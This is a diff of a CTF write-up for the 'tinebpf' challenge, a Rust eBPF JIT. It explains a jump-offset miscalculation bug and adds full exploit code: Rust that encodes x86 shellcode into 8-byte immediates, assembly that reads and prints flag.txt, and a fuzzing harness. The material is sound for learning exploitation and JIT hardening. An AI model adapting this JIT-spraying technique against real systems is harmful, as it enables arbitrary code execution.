@@ -21,20 +21,9 @@ The instructions themselves can't do anything interesting, but there is a bug in
 >
 > tinebpf.chal.pwni.ng 1337
 
-> Provide a task description containing all the basic information:
-> 
-> * Goal of the task
-> * General type of task (web application, cryptography, ...)
-> * Available resources (source code, binary-only, network service, ...)
-> * Any hints you might noticed in the description of the organizers
-> * ...
-
-
 ## Analysis Steps
 
-> Explain your analysis in detail. Cover all the technical aspects, including the used tools and commands. Mention other collaborators and distinguish contributions.
-
-### Initial steps
+Initial steps:
 
 1. Install `rustup` and `IntelliJ Idea` with the Rust plugin and open the project.
 2. Have a look at the files:
@@ -56,7 +45,7 @@ The instructions themselves can't do anything interesting, but there is a bug in
        - `enum BpfSrcT { BpfX, BpfK }`: Not sure what these mean.
        - `enum BpfAluOpT`, `enum BpfJmpOpT`: Both have ~12 members
    - impls and macros to produce machine code
-   - `fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u8]>) -> Option<usize>`
+   - `fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u8]>) -> Option<usize>` returns the machine code size
    - `fn verify_jmps(b_inst: &[BpfInstT]) -> Result<(), &str>`
    - `fn parse_raw_bytes(inp: &[u8]) -> Option<Vec<BpfInstT>>`: essentially a bitcast
    - `main`: 
@@ -90,30 +79,21 @@ The instructions themselves can't do anything interesting, but there is a bug in
     0000003C  B83C000000        mov eax,0x3c
     00000041  0F05              syscall
     ```
+   
+    Alu operations seem to be 3 bytes, immediates 10 and a jump to itself (offset - 1) is always 2 bytes.
+   
 10. At this point I gave up because I was too tired after staying up all night I and wanted to try something easier.
     I went back to this challenge right before the end, but it was already too late and I didn't know how to continue.
     After the CTF was over I deliberately didn't look at any solutions and a few days later I tried again.
- 
-    In the meantime I had understood the purpose of the 20 iterations with the `addrs` array:
-    x86_64 machine code instructions have variable length.
-    The `addrs` array contains the machine code offset for each eBPF instruction.
-    The `emit_cond_jump` function uses the `addrs` array to compute jump offset and emits either a smaller instruction with an 8 bit immediate or a larger one with 32 bits.
-    Because the offsets can change after a branch has been emitted this needs to be repeaded until `addrs` doesn't change anymore.
-
-    I had two main ideas: 1) There might be an overflow of an offset somewhere. 2) Whether `addrs` changes is detected with the total length of the generated instructions, but this does not take into account, that one instruction could have gotten smaller and another larger in the same iteration.
-
 11. Look for overflow and indexing bugs. See [Failed Attempts: Overflow and indexing bugs](#overflow-and-indexing-bugs)
-12. If we have instructions:
-    `i1, jump i2, ...128 bytes..., jump i1, i2`
-    It could be that the size of both jumps oscilates between 8 and 32 byte immediates which would result in an invalid jump at the end.
+12. If we have forward and backward jumps could happen that the size of both jumps oscilates between 8 and 32 bit immediates which would result in an invalid jump at the end.
     At this point I wasted a lot of time with afl and cargo-fuzz again to try to find such a series of instructions.
     See [Failed Attempts: Fuzzing](#fuzzing) below.
 13. Try to find growing/shrinking instructions by hand: By looking at the function `code()` and at machine code I tried to find a way to grow and shrink instructions. Shrinking was easy, but I couldn't come up with anything that grew.
-14. Write code that prints a histogram of instruction sizes. The largest one ws 25 bytes, which is not enough to match the 64 bytes from `let mut olen = insts.len() * 64;`.
-15. Look at some CVEs to get some ideas.
-16. Continue to look for instructions that expand: jumps with offset 0 are size zero, but there is no way to change the offset.
+14. Write code that prints a histogram of instruction sizes. The largest one was only 25 bytes, which is not enough to match the 64 bytes from `let mut olen = insts.len() * 64;`. This means we have to find oscilating instructions.
+15. Continue to look for instructions that expand: jumps with offset 0 are size zero, but there is no way to change the offset.
 
-### Breakthrough
+Breakthrough:
 
 | jump direction | destination addr | source addr |
 |----------------|------------------|-------------|
@@ -123,12 +103,18 @@ The instructions themselves can't do anything interesting, but there is a bug in
 The offset computation of forward and backward jumps differs because `addrs` is updated in place.
 Forward jumps always use both offsets from the previous iteration.
 Backward jumps on the other hand observe the address of the destination that was computed in the current iteration.
-When instructions before the target shrink then the backwards jump could get larger.
 
-### A failed attempt?
+Unconditional jumps are either 2 bytes (8 bit offset) or 5 bytes (32 bit offset).
+When a backward jump is encoded in 2 bytes it can actually grow to 5 bytes, when the instructions before the target shrink enough. For example:
 
-I immediately tried to find instructions with oscilating sizes. 
-Later I found out that this still required an expanding instruction to get into case 2.
+| i1  | i2  | ... | i3 jump to i2 | i4 |
+|-----|-----|-----|---------------|----|
+
+If i1 shrinks from 5 to 2 bytes then i2 moves by 3.
+The offset for i3 is `addrs[i4] - addrs[i2]` because jump offsets are added to the address of the next instruction. Since `addrs[i4]` has not been updated yet this means that a 1 byte offset could turn into a 4 byte offset which would increase the size of i3 by 3 bytes.
+
+I immediately tried to find instructions with oscilating sizes.
+These were some of my notes:
 
 | case  | f=forward jump | s=space | b=backward jump | i=instruction |
 |-------|----------------|---------|-----------------|---------------|
@@ -145,148 +131,357 @@ Later I found out that this still required an expanding instruction to get into 
 
 It follows that `124 <= s <= 125`.
 
-There are two remaining problems:
-- After iteration 0 all jumps are large: This shouldn't be a problem, because f1 shrinks even if f2 is large, which means that we are in case 2 after iteration 1. (I later found out that this is wrong).
-- We need to figure out where the invalid jump goes and if we can place a payload there:
-  After iteration 2 we are in case 1 and we exit the loop because the size didn't change. 
-  This means that in the final code the layout of the instructions will be like case 2:
-  - f2 to i2 should be s+b2 = s+5
-  - b2 to s2 should be s+5
-  But the offsets will be:
-  - off(f2) = addr(i1) - addr(s1) = s1 + b1 = s+2
-  - off(b2) = addr(s2) - addr(i1) = s1 + b1 + 3 = s+5
-  
-  This means that the forward jump will be 3 bytes too short.
-  We can place an immediate right at the end of s and we don't have to put any instructions before f.
+When I implemented this I realized that I would still need an expanding instruction to actually get into case 2.
 
-### Finding a growing instruction
+The final exploit was found with a bit of experimentation. It is described below.
 
-| i1: shrinks | i2: target | i3: space | i4: backwards jump | i5 |
-|-------------|------------|-----------|--------------------|----|
+## Vulnerabilities / Exploitable Issue(s)
 
-1. i1 shrinks from 5 to 2.
-2. i2 moves by 3
-3. i4 grows by 3 because it reads the new position of i2 but the old position of i5.
+Invalid addresses are used when generating code, which allows us to jump into an immediate.
 
-for simplicity assume s are instructions of size 1
+## Solution
 
-| byte size      | f to (s123-s125) | f to s127 | s      | b to sx | 
-|----------------|------------------|-----------|--------|-----------|
-| initial        | 64               | 64        | 64 * s | 64        |
-| after 1*do_jit | 2*5              | 5         | s      | 5         |
-| after 2*do_jit | 2*5              | 2         | s      | 2         |
-| after 3*do_jit | 2*2              | 2         | s      | 5         |
+We are going to create as specific pattern of tinebpf instructions that end up jumping into an immediate.
+Each one is 8 bytes, but we use 2 of them to jump to the next immediate:
 
-While experimenting around I found a solution where the backwards jump expands during the 3rd do_jit:
+```rust
+fn encode_immediate(machine_code: &[u8], jump_offset: u8) -> u64 {
+    assert!(machine_code.len() <= 6);
+
+    let mut value = [0x90; 8]; // NOPs
+    value[0..machine_code.len()].copy_from_slice(machine_code);
+    value[6] = 0xeb; // JMP
+    value[7] = jump_offset;
+
+    u64::from_le_bytes(value)
+}
+```
+
+The `Dockerfile` tells us that the flag is in a file. The following assembly code can read it and write it to stdout:
+
+```
+BITS 64
+
+; NOTE: instructions must be <= 6 bytes
+;
+; preconditions:
+;   rax, rbx contain "flag.txt\0"
+
+    mov     [rsp], rax
+    mov     [rsp+8], rbx
+
+    mov     rdi, rsp   ; const char *filename
+    xor     rsi, rsi   ; int flags
+    xor     rdx, rdx   ; int mode
+    mov     rax, 2     ; sys_open
+    syscall            ; returns file descriptor
+
+    mov     rdi, rax   ; unsigned int fd
+    mov     rsi, rsp   ; char *buf
+    mov     rdx, 100   ; size_t count
+    xor     rax, rax   ; sys_read
+    syscall            ; returns number of bytes read
+
+    mov     rdi, 1     ; unsigned int fd = stdout
+    mov     rsi, rsp   ; const char *buf
+    mov     rdx, rax   ; size_t count
+    mov     rax, 1     ; sys_write
+    syscall
+```
+
+Assemble it with `nasm` and parse the offset of each instruction from the output of `ndisasm`:
+
+```rust
+struct MachineCodeInstructions {
+    code: Vec<u8>,
+    offsets: Vec<usize>,
+    sizes: Vec<usize>,
+}
+
+impl MachineCodeInstructions {
+    fn nth(&self, index: usize) -> Option<&[u8]> {
+        self.offsets.get(index).map(|&offset| {
+            &self.code[offset..offset + self.sizes[index]]
+        })
+    }
+}
+
+fn assemble_payload(assembly: &Path, machine_code: &Path, disassembly: &Path) -> MachineCodeInstructions {
+    let nasm = Command::new("nasm")
+        .args(["-f", "bin", "-o"])
+        .arg(machine_code)
+        .arg(assembly)
+        .status().unwrap();
+    assert!(nasm.success());
+
+    let ndisasm = Command::new("ndisasm")
+        .args(["-b", "64"])
+        .arg(machine_code)
+        .stderr(Stdio::inherit())
+        .output().unwrap();
+
+    let out_string = String::from_utf8(ndisasm.stdout).unwrap();
+    std::fs::write(disassembly, &out_string).unwrap();
+
+    // NOTE: Contents look like this:
+    // 00000000  48B8666C61672E74  mov rax,0x7478742e67616c66
+    //          -7874
+    // 0000000A  48890424          mov [rsp],rax
+    let mut offsets = vec![];
+    for line in out_string.lines() {
+        if let Some(c) = line.chars().next() {
+            if c.is_digit(16) {
+                let offset = line.split_whitespace().next().unwrap();
+                let offset = usize::from_str_radix(offset, 16).unwrap();
+                offsets.push(offset);
+            }
+        }
+    }
+
+    let code = std::fs::read(machine_code).unwrap();
+
+    let mut sizes = vec![];
+    for i in 0..offsets.len() {
+        let start = offsets[i];
+        let end = offsets.get(i + 1).cloned().unwrap_or(code.len());
+        sizes.push(end - start);
+    }
+
+    MachineCodeInstructions { code, offsets, sizes }
+}
+```
+
+In the initial version of the exploit there was a limited number of immediates that could contain machine code, so I combined small instructions to a `max` size of 6 bytes:
+
+```rust
+impl MachineCodeInstructions {
+    fn combine(&mut self, max: usize) {
+        let mut offsets = vec![];
+        let mut sizes = vec![];
+        for (&offset, &size) in self.offsets.iter().zip(&self.sizes) {
+            match sizes.last_mut() {
+                Some(last) if *last + size <= max => *last += size,
+                _ => {
+                    offsets.push(offset);
+                    sizes.push(size);
+                },
+            }
+        }
+        self.offsets = offsets;
+        self.sizes = sizes;
+    }
+}
+```
+
+Loading an 8 byte immediate takes two `BpfInstT` instructions. This helper function appends them to a list:
+
+```rust
+fn add_immediate(instructions: &mut Vec<BpfInstT>, reg: BpfRegT, value: u64) {
+    // make sure that this will be 8 bytes
+    assert!(!is_uimm32!(value));
+    instructions.push(BpfInstT { opc: 0x18, regs: reg as u8, off: 0, imm: value as u32 as i32 });
+    instructions.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
+}
+```
+
+The follwing function builds the string that we will have to send to the server.
+First it parses and shrinks our assembly payload.
+Then it emits two instructions to load `flag.txt\0` into `R0/rax` and `R6/rbx`
+The payload is encoded into the immediates.
+The jumps and padding are explained below.
+Finaly the instructions are converted to binary with `to_raw_bytes`, encoded in hex and written to the file `exploit.hex`.
+The final step is to `telnet` to the server and paste in the contents of that file.
 
 ```rust
 fn exploit() {
+    let mut payload = assemble_payload(Path::new("payload.asm"), Path::new("payload.machine_code"), Path::new("payload.disasm"));
+    payload.combine(6);
+
+    let two_bytes = BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 };
     let mut instructions = vec![];
 
-    // shrink 2
+    // store "flag.txt\0" into rax and rbx
+    add_immediate(&mut instructions, BpfRegT::R0, u64::from_le_bytes(*b"flag.txt"));
+    add_immediate(&mut instructions, BpfRegT::R6, u64::from_le_bytes(*b"\01234567"));
+
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 4 + 1*2, imm: 0 });
+
     // off: 5 2 10 2 bytes
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
     instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });
 
-    // shrink 1
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
+    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 });
+    instructions.push(two_bytes.clone());
 
-    for _ in 0..11 {
-        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
+    // invalid jump goes here:
+    //   eb02 jumps 2 bytes forward
+    //   cc causes SIGTRAP for debugger
+    // add_immediate(&mut instructions, 0x02ebcc_00_00000000);
+    add_immediate(&mut instructions, BpfRegT::R0, 0x02eb90_00_00000000);
+
+    // 100 bytes padding with payload
+    for i in 0..10 {
+        let jump_offset = if i < 9 { 2 } else { 14 * 2 + 2 };
+        let immediate = encode_immediate(payload.nth(i).unwrap_or(&[]), jump_offset);
+        add_immediate(&mut instructions, BpfRegT::R0, immediate);
     }
 
-    let n = 9;
-    for _ in 0..n {
-        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    // JUMP0
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: 8 + 1 + 4 + 10*2, imm: 0 });
+
+    for _ in 0..8 {
+        instructions.push(two_bytes.clone());
     }
 
     // off: 2|5 2 10
-    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - n - 10*2, imm: 0 });
+    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - 8 - 1 - 10*2, imm: 0 });
+
+    for _ in 0..4 {
+        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
+    }
+
+    // 100+ bytes padding with payload
+    let n = 10 + payload.offsets.len().max(11);
+    for i in 10..n {
+        let jump_offset = if i < n { 2 } else { 0 };
+        let immediate = encode_immediate(payload.nth(i).unwrap_or(&[]), jump_offset);
+        add_immediate(&mut instructions, BpfRegT::R0, immediate);
+    }
+
+    let bytes = to_raw_bytes(&instructions);
+    let mut encoded = hex::encode(bytes);
+    encoded.push('\n');
+    std::fs::write("exploit.hex", encoded).unwrap();
 
     run(&instructions);
 }
 ```
 
-If I move the forward jump that collapses first to the right then we shoudl be able to use approach 1.
+The final call to `run` was only used during development. It contained the core logic of the original `main`, but with some debug output to show the machine code length of each instruction and the jump offset.
 
-
-### Verifying the encoding of instructions
-
-By looking at the code we can see that only 8 byte immediates are supported and as long as the immediate is large enough `emit_mov_imm64` will emit 10 bytes.
-For the remaining 4 or 5 bytes we can use 2 byte jumps that jump to themselves.
-
-```rust
-let instructions = vec![
-    BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
-    BpfInstT { opc: 0x18, regs: 0, off: 0, imm: 0xb3b2b1b0u32 as i32 },
-    BpfInstT { opc: 0,    regs: 0, off: 0, imm: 0xb7b6b5b4u32 as i32 },
-    BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
-];
-...
-let output_size = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
-disassemble(&image[PROLOGUELEN..output_size - EPILOGUELEN], "some_instructions")
 ```
-The output is as expected:
-```
-00000000  EBFE              jmp short 0x0
-00000002  48B8B0B1B2B3B4B5  mov rax,0xb7b6b5b4b3b2b1b0
--B6B7
-0000000C  EBFE              jmp short 0xc
+olen 4544
+ilens: 10, 10, (5 384), (5 1728), (5 1856), (5 1920), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 2112), 2, 2, 2, 2, 2, 2, 2, 2, (5 -2572), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+nlen 368
+ilens: 10, 10, (2 27), (5 129), (5 130), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 129), 2, 2, 2, 2, 2, 2, 2, 2, (5 -129), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+nlen 365
+ilens: 10, 10, (2 27), (5 129), (5 130), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 129), 2, 2, 2, 2, 2, 2, 2, 2, (2 -126), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+nlen 362
+ilens: 10, 10, (2 27), (5 129), (5 130), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (2 126), 2, 2, 2, 2, 2, 2, 2, 2, (2 -123), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+nlen 359
+ilens: 10, 10, (2 27), (2 126), (2 127), (2 126), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (2 126), 2, 2, 2, 2, 2, 2, 2, 2, (5 -129), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+nlen 353
+ilens: 10, 10, (2 18), (2 120), (2 124), (2 126), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (5 129), 2, 2, 2, 2, 2, 2, 2, 2, (2 -123), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+nlen 353
+flag=true, addrs changed
+ilens: 10, 10, (2 18), (2 123), (2 127), (5 129), 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, (2 126), 2, 2, 2, 2, 2, 2, 2, 2, (2 -120), 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10
+Running jitted code:
+FLAG{TEST_FLAG}
 ```
 
-### Creating the exploit
+| j6 | j3 j4 j5 | t1  | j2 | t3 t4 t5 | j1 | t2 |
+|----|----------|-----|----|----------|----|----|
 
-I wrote some assembly and compiled it into binary:
-```shell
-nasm -f bin payload.asm
-ndisasm -b 64 payload
-```
-output:
-```
-00000000  48890424          mov [rsp],rax
-00000004  48895C2408        mov [rsp+0x8],rbx
-00000009  4889E7            mov rdi,rsp
-0000000C  B802000000        mov eax,0x2
-00000011  0F05              syscall
-00000013  4889C7            mov rdi,rax
-00000016  4889E6            mov rsi,rsp
-00000019  BA64000000        mov edx,0x64
-0000001E  4831C0            xor rax,rax
-00000021  0F05              syscall
-00000023  BF01000000        mov edi,0x1
-00000028  4889F8            mov rax,rdi
-0000002B  0F05              syscall
-```
+- All jumps are forward except j1.
+- Because of the way addrs is initialized it takes 3 iterations until `j1` is 2 bytes small.
+- This causes j2 to shrink as well.
+- Then j3, j4, and j5 all shrink at the same time which causes j1 to expand.
+- In the final iteration of the loop j2 grows again because it sees the larger j1. This is canceled out by j1 which shrinks again.
+- Even though addrs changed the total code size stayed the same and we break out of the loop.
+- In the last iteration j5 is emitted as a 5 byte jump. But j6 uses the old offset in the addrs array, which assumes that j5 is only 2 bytes. Thus j6 ends up 3 bytes too short. That is why the instruction before the target of 6j is an immediate.
 
-Manually record the sizes. In an 8 byte immediate we can use at most 6 bytes, because the last 2 are requried for the jump.
-```rust
-    let payload_sizes = [4, 5, 3, 5, 2+3, 3, 5, 3+2, 5, 3+2];
-```
 
-For the first version of my exploit I reduced the size of the payload as much as possible
-to fit it into 10 immediates. 
-
-In the final solution for this writeup I improved the payload (e.g. it only prints the bytes that were actually read from the file)
-and I automated the machine code generation and the extraction of the instruction sizes.
-
-## Vulnerabilities / Exploitable Issue(s)
-
-> List security issues you discovered in the scope of the task and how they could be exploited.
-
-overflow
-code injection
-
-## Solution
-
-> Provide a clean (i.e., without analysis and research steps) guideline to get from the task description to the solution. If you did not finish the task, take your most promising approach as a goal.
 
 ## Failed Attempts
 
-> Describe attempts apart from the solution above which you tried. Recap and try to explain why they did not work.
-
 ### Fuzzing
-I tried fuzzing with random instructions to get a crash, but in hindsight it would have been better to use a more systematic approach first.
+
+I tried fuzzing with random instructions to produce invalid jumps, but in hindsight it would have been better to use a more systematic approach first.
+
+I followed the rust fuzzing book. [^3]
+I couldn't get `cargo-fuzz` to work. 
+`afl` worked but with no results.
+
+```rust
+use afl::fuzz;
+
+fn main() {
+    fuzz!(|data: tinebpf::main::FuzzInput| {
+        tinebpf::main::fuzz(data.instructions);
+    });
+}
+```
+
+```rust
+#[derive(Debug)]
+pub struct FuzzInput {
+    pub instructions: Vec<BpfInstT>
+}
+
+impl<'a> Arbitrary<'a> for FuzzInput {
+    fn arbitrary(u: &mut Unstructured<'a>) -> arbitrary::Result<Self> {
+        let len = u.arbitrary_len::<BpfInstT>()? % MAXBPFINST;
+        let mut instructions = Vec::with_capacity(len.into());
+        for i in 0..len {
+            let index = (u16::arbitrary(u)? % (MAXBPFINST as u16 + 1)) as i16; // reduce the possibilities
+            let off = index - (i as i16 + 1);
+            let imm = i16::arbitrary(u)? as i32; // reduce the possibilities
+            let regs = loop {
+                let regs = u8::arbitrary(u)?;
+                if (regs & 0xf0) > 0x90 || (regs & 0x0f) > 0x09 {
+                    continue;
+                }
+                break regs;
+            };
+            loop {
+                let opc = loop {
+                    let opc = u8::arbitrary(u)?;
+                    if is_supported(opc) {
+                        break opc;
+                    }
+                };
+                let inst = BpfInstT {
+                    opc: opc as u8,
+                    regs: regs as u8,
+                    off,
+                    imm,
+                };
+                if inst.code().is_some() {
+                    instructions.push(inst);
+                    break;
+                }
+            };
+        }
+        Ok(FuzzInput{instructions})
+    }
+}
+
+pub fn fuzz(insts: Vec<BpfInstT>) {
+    if verify_jmps(&insts).is_ok() {
+        let mut olen = insts.len() * 64;
+        let plen = PROLOGUELEN as u32;
+        let mut addrs: Vec<u32> = (0..insts.len() + 1).map(|i| plen + 64 * i as u32).collect();
+        let mut addrs2: Vec<u32> = addrs.clone();
+
+        for _ in 0..20 {
+            addrs2.copy_from_slice(&addrs);
+            if let Some(nlen) = do_jit(&insts, &mut addrs, None) {
+                if nlen == olen {
+                    if addrs2 != addrs {
+                        println!("same length but different!");
+                        assert_eq!(addrs2, addrs, "same length but different!");
+                    }
+                    break;
+                }
+                olen = nlen;
+            } else {
+                break;
+            }
+        }
+    }
+}
+```
 
 ### Overflow and indexing bugs
 
@@ -324,16 +519,14 @@ Look at `veriy_jumps`: Think about jumping into immediates or other indexing bug
 - I learned about the `Arbitrary` trait to generate random Rust datastructures.
 - I learned what eBPF is
 
-Test [^5]
-
 ## References
 
 > List external resources (academic papers, technical blogs, CTF writeups, ...) you used while working on this task.
 
 - [^1]: eBPF: https://ebpf.io/ https://en.wikipedia.org/wiki/Berkeley_Packet_Filter
+- [^3]: fuzzing Rust (cargo-fuzz and afl): https://rust-fuzz.github.io/book/introduction.html
 - [^5] unofficial eBPF documentation: https://github.com/iovisor/bpf-docs/blob/master/eBPF.md
 - git repo: https://gitlab.defbra.xyz/ro/tinebpf (ssh://git@gitlab.defbra.xyz:1850/ro/tinebpf.git)
-- fuzzing Rust (cargo-fuzz and afl): https://rust-fuzz.github.io/book/introduction.html
 - amd64 instructions: https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf
 - http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
 
